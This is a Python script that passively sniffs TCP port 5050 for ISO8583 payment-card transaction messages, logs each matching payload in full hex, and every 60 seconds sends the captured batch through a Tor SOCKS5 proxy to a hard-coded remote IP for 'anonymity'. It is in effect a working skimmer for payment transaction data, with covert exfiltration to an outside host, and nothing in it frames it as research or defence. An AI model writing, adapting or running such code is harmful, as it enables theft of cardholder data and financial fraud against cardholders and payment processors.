import socks
import socket
import threading
import time
from scapy.all import sniff, TCP, Raw

# Global list to store detected log entries
logs = []

def process_packet(packet):
    """
    Callback to process captured packets.
    Looks for TCP packets on port 5050 with a potential ISO8583 structure:
    - First 2 bytes: length header (big-endian)
    - Next 4 bytes: MTI (expected to be a 4-digit ASCII number)
    """
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        tcp_layer = packet[TCP]
        # Check if either source or destination port is 5050
        if tcp_layer.dport == 5050 or tcp_layer.sport == 5050:
            payload = packet[Raw].load
            if len(payload) >= 6:
                # Extract 2-byte length header and 4-byte MTI
                length_field = int.from_bytes(payload[:2], byteorder='big')
                mti_bytes = payload[2:6]
                try:
                    mti_str = mti_bytes.decode('ascii')
                except UnicodeDecodeError:
                    mti_str = ""
                # Check if MTI is numeric and 4 characters long
                if mti_str.isdigit() and len(mti_str) == 4:
                    log_entry = f"Length: {length_field}, MTI: {mti_str}, Payload: {payload.hex()}"
                    print("Detected:", log_entry)
                    logs.append(log_entry)

def send_logs():
    """
    Periodically (every 60 seconds) sends any captured log entries
    to a remote server via a SOCKS5 proxy for anonymity.
    Adjust remote_host and remote_port to your logging server.
    """
    # Proxy settings (for example, Tor running on 127.0.0.1:9050)
    proxy_host = '127.0.0.1'
    proxy_port = 9050
    # Remote logging server settings (replace with your own)
    remote_host = '23.33.244.104'
    remote_port = 443

    while True:
        if logs:
            # Copy current logs and clear the list
            log_batch = logs.copy()
            logs.clear()
            try:
                # Create a SOCKS socket and route through the proxy
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
                s.settimeout(10)
                s.connect((remote_host, remote_port))
                # Send logs as UTF-8 encoded text (each log on a new line)
                data = "\n".join(log_batch)
                s.sendall(data.encode('utf-8'))
                s.close()
                print(f"Sent {len(log_batch)} log entries to remote server.")
            except Exception as e:
                print("Error sending logs:", e)
        # Wait for 60 seconds before attempting to send again
        time.sleep(60)

def main():
    # Start a background thread to periodically send logs via proxy.
    sender_thread = threading.Thread(target=send_logs, daemon=True)
    sender_thread.start()

    # Start passive sniffing on TCP port 5050.
    print("Starting passive sniffing on TCP port 5050. Press CTRL+C to stop.")
    sniff(filter="tcp port 5050", prn=process_packet, store=False)

if __name__ == '__main__':
    main()